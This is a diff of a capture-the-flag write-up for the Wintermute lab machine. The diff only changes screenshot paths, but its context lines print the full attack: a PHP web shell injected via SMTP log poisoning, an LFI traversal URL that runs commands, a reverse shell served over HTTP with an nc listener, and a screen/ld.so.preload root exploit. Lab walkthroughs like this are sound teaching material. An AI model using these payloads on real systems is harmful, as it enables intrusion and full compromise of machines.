@@ -21,14 +21,14 @@ Wintermute is a Linux-based vulnerable machine that simulates a small internal n
 
 Identified the target machine's IP address on the local network using Netdiscover.
 
-![Netdiscover scan](screenshots/image1.png)
-![Target IP identified](screenshots/image2.png)
+![Netdiscover scan](image1.png)
+![Target IP identified](image2.png)
 
 ## 2. Port Scanning
 
 Ran an Nmap scan against the target to enumerate open ports and running services.
 
-![Nmap scan results](screenshots/image5.png)
+![Nmap scan results](image5.png)
 
 Two relevant ports were identified:
 - **Port 25** — SMTP (mail service)
@@ -36,33 +36,33 @@ Two relevant ports were identified:
 
 Port 25 was restricted from direct interaction, but port 3000 hosted a login page.
 
-![Login page on port 3000](screenshots/image6.png)
-![Web application on port 3000](screenshots/image7.png)
+![Login page on port 3000](image6.png)
+![Web application on port 3000](image7.png)
 
 ## 3. Initial Access — Default Credentials
 
 The application's login page hinted at default credentials (`admin` / `admin`), which granted access to the dashboard.
 
-![Successful login with default credentials](screenshots/image8.png)
+![Successful login with default credentials](image8.png)
 
 ## 4. Application Enumeration
 
 Browsing the dashboard revealed a network-monitoring interface with two discoverable paths: `/turing-bolo` and `/freeside`.
 
-![Discovered application paths](screenshots/image9.png)
-![Turing-bolo interface](screenshots/image10.png)
-![Freeside interface](screenshots/image11.png)
+![Discovered application paths](image9.png)
+![Turing-bolo interface](image10.png)
+![Freeside interface](image11.png)
 
 Further exploration surfaced a "case" option that changed the URL structure, revealing that the application could load user log files based on a URL parameter.
 
-![Case option in the application](screenshots/image12.png)
-![URL parameter change on case selection](screenshots/image13.png)
+![Case option in the application](image12.png)
+![URL parameter change on case selection](image13.png)
 
 ## 5. Local File Inclusion (LFI)
 
 Given the presence of an SMTP service, the mail log file (`/var/log/mail`) was tested as an LFI target — and successfully retrieved.
 
-![Mail log file read via LFI](screenshots/image14.png)
+![Mail log file read via LFI](image14.png)
 
 This suggested a classic **log poisoning** opportunity: since the application could read the SMTP log, any content injected into that log via a raw SMTP session — including PHP code — could potentially be executed by the LFI vulnerability.
 
@@ -77,7 +77,7 @@ RCPT TO: root
 DATA
 ```
 
-![Manual SMTP session via Telnet](screenshots/image15.png)
+![Manual SMTP session via Telnet](image15.png)
 
 - `EHLO` — greets the mail server, identifying the client (the modern equivalent of `HELO`)
 - `MAIL FROM` — declares the sender address
@@ -86,7 +86,7 @@ DATA
 
 Sending a test message confirmed that message content was written directly into `/var/log/mail`.
 
-![Test mail entry appearing in the log](screenshots/image16.png)
+![Test mail entry appearing in the log](image16.png)
 
 A second message was then crafted with a PHP web shell payload injected into the `RCPT TO` field:
 
@@ -95,7 +95,7 @@ MAIL FROM: <mail@mail.com>
 RCPT TO: <?php system($_GET['cmd']); ?>
 ```
 
-![PHP payload injected into SMTP session](screenshots/image17.png)
+![PHP payload injected into SMTP session](image17.png)
 
 The payload was confirmed present in the log file. Requesting the LFI endpoint with the log file path and a `cmd` parameter executed the injected PHP code, confirming **LFI-to-RCE**:
 
@@ -103,12 +103,12 @@ The payload was confirmed present in the log file. Requesting the LFI endpoint w
 http://10.0.2.13/turing-bolo/bolo.php?bolo=../../../../../var/log/mail&cmd=whoami
 ```
 
-![RCE confirmed via whoami](screenshots/image18.png)
+![RCE confirmed via whoami](image18.png)
 
 Output confirmed code execution as `www-data`. Further command execution confirmed access to `/etc/passwd`, revealing two notable local users: `wintermute` and `turing-police`.
 
-![Reading /etc/passwd via RCE](screenshots/image19.png)
-![Command execution confirming current user](screenshots/image20.png)
+![Reading /etc/passwd via RCE](image19.png)
+![Command execution confirming current user](image20.png)
 
 ## 7. Establishing a Reverse Shell
 
@@ -121,8 +121,8 @@ mv php-reverse-shell.php reversemonkey.txt
 python3 -m http.server 8080
 ```
 
-![Reverse shell prepared and served](screenshots/image21.png)
-![HTTP server hosting the payload](screenshots/image22.png)
+![Reverse shell prepared and served](image21.png)
+![HTTP server hosting the payload](image22.png)
 
 The payload was pulled onto the target via the RCE primitive, saved with a `.php` extension inside the web root, and made executable:
 
@@ -139,7 +139,7 @@ nc -lvnp 4444
 
 Triggering the uploaded script via the browser returned a shell connection to the listener.
 
-![Reverse shell connection received](screenshots/image23.png)
+![Reverse shell connection received](image23.png)
 
 The shell was upgraded to a full TTY for usability:
 
@@ -157,7 +157,7 @@ Searched for SUID binaries:
 find / -type f -perm -04000 -ls 2>/dev/null
 ```
 
-![SUID binary enumeration results](screenshots/image24.png)
+![SUID binary enumeration results](image24.png)
 
 Most binaries found were not exploitable (`su`, `passwd`, `ping`), but **`screen`** stood out. A binary with the SUID bit set is not automatically exploitable — it depends on the binary's version, its exposed functionality, and whether it can be leveraged to write to arbitrary files. In this case, the installed `screen` version was vulnerable to a known privilege escalation technique.
 
@@ -204,7 +204,7 @@ Compiled with:
 gcc -o /tmp/rootshell /tmp/rootshell.c
 ```
 
-![Compiling the privilege escalation payloads](screenshots/image25.png)
+![Compiling the privilege escalation payloads](image25.png)
 
 **Step 3 — Trigger via `screen`.** With `umask 000` set to ensure newly created files were world-writable, the SUID `screen` binary was abused to write the malicious library's path into `/etc/ld.so.preload` — a file that, when populated, causes the dynamic linker to load the specified library into every subsequently executed process:
 
@@ -213,7 +213,7 @@ umask 000
 screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"
 ```
 
-![Writing to /etc/ld.so.preload via screen](screenshots/image26.png)
+![Writing to /etc/ld.so.preload via screen](image26.png)
 
 Once any process loaded `/tmp/libhax.so`, it silently granted `/tmp/rootshell` the SUID bit and root ownership. Executing `/tmp/rootshell` then dropped into a root-owned shell:
 
@@ -221,7 +221,7 @@ Once any process loaded `/tmp/libhax.so`, it silently granted `/tmp/rootshell` t
 /tmp/rootshell
 ```
 
-![Root shell obtained](screenshots/image27.png)
+![Root shell obtained](image27.png)
 
 The shell was upgraded again for stability:
 
@@ -235,7 +235,7 @@ python -c 'import pty; pty.spawn("/bin/bash")'
 384ghsw4jth390hgwo49t02jv92348gh
 ```
 
-![Root access and flag captured](screenshots/image28.png)
+![Root access and flag captured](image28.png)
 
 ---
 
